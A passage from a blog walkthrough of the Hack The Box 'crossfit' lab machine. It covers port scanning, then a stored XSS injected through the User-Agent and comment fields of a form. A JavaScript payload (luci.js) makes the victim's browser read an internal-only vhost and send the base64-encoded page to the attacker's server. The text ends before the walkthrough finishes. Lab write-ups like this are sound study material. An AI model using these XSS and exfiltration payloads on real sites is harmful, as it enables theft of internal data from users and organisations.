<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release:	19 Sep 2020IP:	10.10.10.208 User Blood haqpl	00 days, 15 hours, 52 mins, 14 seconds.Root Blood haqpl	01 days, 00 hours, 25 mins, 20 seconds.">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[crossfit]">
<meta property="og:url" content="https://fdlucifer.github.io/2020/11/28/crossfit/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release:	19 Sep 2020IP:	10.10.10.208 User Blood haqpl	00 days, 15 hours, 52 mins, 14 seconds.Root Blood haqpl	01 days, 00 hours, 25 mins, 20 seconds.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb126.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb127.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb129.jpg">
<meta property="article:published_time" content="2020-11-28T07:49:41.000Z">
<meta property="article:modified_time" content="2021-03-20T16:04:44.992Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb126.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2020/11/28/crossfit/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/11/28/crossfit/","path":"2020/11/28/crossfit/","title":"Hack-The-Box-walkthrough[crossfit]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[crossfit] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="lUc1f3r11's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">202</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-1"><span class="nav-number">4.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-2"><span class="nav-number">5.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-1-1"><span class="nav-number">6.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-2-1"><span class="nav-number">7.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-3"><span class="nav-number">8.</span> <span class="nav-text">step 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-4"><span class="nav-number">9.</span> <span class="nav-text">step 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-5"><span class="nav-number">10.</span> <span class="nav-text">step 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">11.</span> <span class="nav-text">Privilege escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">11.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">11.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/11/28/crossfit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[crossfit] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[crossfit]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-11-28 15:49:41" itemprop="dateCreated datePublished" datetime="2020-11-28T15:49:41+08:00">2020-11-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-03-21 00:04:44" itemprop="dateModified" datetime="2021-03-21T00:04:44+08:00">2021-03-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span></span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>NaN:aN</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	 Insane<br>Points:	50<br>Release:	19 Sep 2020<br>IP:	10.10.10.208</p>
<p>User Blood haqpl	00 days, 15 hours, 52 mins, 14 seconds.<br>Root Blood haqpl	01 days, 00 hours, 25 mins, 20 seconds.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb126.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.208</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>There is a default apache web server page.</p>
<p>I use gobuster but nothing interesting found.</p>
<p>And also ftp anonymous login is not allowed.</p>
<p>So i run nmap again for a specific port.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p 21 -vvv 10.10.10.208</span></span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later</span><br><span class="line">| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb</span><br><span class="line">| Issuer: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-04-30T19:16:46</span><br><span class="line">| Not valid after:  3991-08-16T19:16:46</span><br><span class="line">| MD5:   557c 36e4 424b 381e eb17 708a 6138 bd0f</span><br><span class="line">| SHA-1: 25ec d2fe 6c9d 7704 ec7d d792 8767 4bc3 8d0e cbce</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIID0TCCArmgAwIBAgIUFlxL1ZITpUBfx69st7fRkJcsNI8wDQYJKoZIhvcNAQEL</span><br><span class="line">| BQAwdzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMRcwFQYDVQQKDA5Dcm9zcyBG</span><br><span class="line">| aXQgTHRkLjEXMBUGA1UEAwwOKi5jcm9zc2ZpdC5odGIxKTAnBgkqhkiG9w0BCQEW</span><br><span class="line">| GmluZm9AZ3ltLWNsdWIuY3Jvc3NmaXQuaHRiMCAXDTIwMDQzMDE5MTY0NloYDzM5</span><br><span class="line">| OTEwODE2MTkxNjQ2WjB3MQswCQYDVQQGEwJVUzELMAkGA1UECAwCTlkxFzAVBgNV</span><br><span class="line">| BAoMDkNyb3NzIEZpdCBMdGQuMRcwFQYDVQQDDA4qLmNyb3NzZml0Lmh0YjEpMCcG</span><br><span class="line">| CSqGSIb3DQEJARYaaW5mb0BneW0tY2x1Yi5jcm9zc2ZpdC5odGIwggEiMA0GCSqG</span><br><span class="line">| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDgibxJvtPny7Vee6M0BFBPFBohEQ+0zLDq</span><br><span class="line">| LdkW/OSl4tfEdZYn6U5cNYKTyYJ8CuytGlMpFw5OgOBPATtBYoGrQZdlN+7LQwF+</span><br><span class="line">| CZsedPs30ijAhygI7pM5S0hwiqdVReR/hhFHD/zry3M5+9NGeDLPgLbQG8qgPspv</span><br><span class="line">| Y+ErCXXotxVI+VrTPfGkjPixfgUTYsEetrkmXlig0S2ukxmNs7HXkjli4Z+qpGrn</span><br><span class="line">| mpFQokBE6RlD6VjxPzx0pfgK587s7F0/pIfXTHGfIOMnqXuLKBXsYIAEjJQxlLUt</span><br><span class="line">| U3lb7aZdqIZnvhTuzuOxFUIe5dRWyfERyODEd5WUlwsbY4Qo2HhZAgMBAAGjUzBR</span><br><span class="line">| MB0GA1UdDgQWBBTG3S2NuuXiSQ4dRvDnLqiWQdvY7jAfBgNVHSMEGDAWgBTG3S2N</span><br><span class="line">| uuXiSQ4dRvDnLqiWQdvY7jAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA</span><br><span class="line">| A4IBAQB/tGKHZ9oXsqLGGW0wRRgCZj2adl1sq3S69e9R4yVQW7zU2Sw38CAA/O07</span><br><span class="line">| MEgbqrzUI0c/T+Wb1D+gRamCUxSB7FXfMzGRhwUqMsLp8uGNlxyDcMU34ecRwOil</span><br><span class="line">| r4jLmfeGyok1r8CFHg8Om1TeZfzNeVtkAkqf3XoIxbKQk4s779n/84FAtLkZNqyb</span><br><span class="line">| cSv8nnClQQSlf42P3AiRBbwM1Cx9SyKq977sIwOzKTOM4NcSivNdtov+Pc0z+T9I</span><br><span class="line">| 95SsqLKtO/8T0h6hgY6JQG1+A4ivnlZ8nqSFWYsnX10lJN2URlAwXUYuTw0vCMy+</span><br><span class="line">| Xk0OmbR/oG052H02ZsmfJQhqPNF1</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">Service Info: Host: Cross</span><br></pre></td></tr></table></figure>

<p>So with the help of nmap we find 1 sub-domain Let’s add this in our &#x2F;etc&#x2F;hosts file.</p>
<p>nano &#x2F;etc&#x2F;hosts</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.208      gym-club.crossfit.htb</span><br></pre></td></tr></table></figure>

<p>Let’s go to <span class="exturl" data-url="aHR0cDovL2d5bS1jbHViLmNyb3NzZml0Lmh0Yi8=">http://gym-club.crossfit.htb/<i class="fa fa-external-link-alt"></i></span>.</p>
<p>After some enumeration i find a comment form let’s try something in that.</p>
<p>First i capture the request in my burp and try various thing like XSS.</p>
<p>I change User-Agent feild and comment feild to ping my python simpleHttpServer.</p>
<p><span class="exturl" data-url="aHR0cDovL2d5bS1jbHViLmNyb3NzZml0Lmh0Yi9ibG9nLXNpbmdsZS5waHA=">http://gym-club.crossfit.htb/blog-single.php<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.8:8001/&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /blog-single.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">User-Agent: &lt;script src=<span class="string">&quot;http://10.10.14.8:8001/&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 154</span><br><span class="line"></span><br><span class="line">Origin: http://gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://gym-club.crossfit.htb/blog-single.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=lucifer11&amp;email=1185151867%40qq.com&amp;phone=17746608760&amp;message=&lt;script src=<span class="string">&quot;http://10.10.14.8:8001/&quot;</span>&gt;&lt;/script&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer 8001                                                                           </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8001 ...</span><br><span class="line">10.10.10.208 - - [28/Nov/2020 08:19:27] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>Now i try everything but nothing work so think about other ways that we need to attack ftp.crossfit.htb.</p>
<p>But the question is where he find that subdomain.</p>
<p>After some hit and try i understand that we need to find that from localhost (using XSS) can see another vhost that only accepts resquest from the local machine and the host is ftp.crossfit.htb that thinking about.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9taW5jb25nLmlvLzIwMTgvMDYvMTkvc2VuZGluZy1odHRwLXJlcXVlc3QtZnJvbS1icm93c2VyLw==">Create a HTTP Request in JS<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>With the help of this article i find my way to communicate with ftp.crossfit.htb.</p>
<p>So what we do now we create a .js file called luci.js that give the response page of the ftp.crossfit.htb in our python server.</p>
<p>Let’s try this real quick.</p>
<h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><p>Create a file called luci.js</p>
<ul>
<li>luci.js</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">myhttpserver = <span class="string">&#x27;http://10.10.14.8/&#x27;</span></span><br><span class="line">targeturl = <span class="string">&#x27;http://ftp.crossfit.htb/&#x27;</span></span><br><span class="line"></span><br><span class="line">req = new XMLHttpRequest;</span><br><span class="line">req.onreadystatechange = <span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == 4) &#123;</span><br><span class="line">            req2 = new XMLHttpRequest;</span><br><span class="line">            req2.open(<span class="string">&#x27;GET&#x27;</span>, myhttpserver + btoa(this.responseText),<span class="literal">false</span>);</span><br><span class="line">            req2.send();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">req.open(<span class="string">&#x27;GET&#x27;</span>, targeturl, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br></pre></td></tr></table></figure>

<h3 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h3><p>Open a python simple http server in your working directory were the luci.js file exist.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>Now capture the request of comment form and send it to the repeater tab and add the value that show in the image.</p>
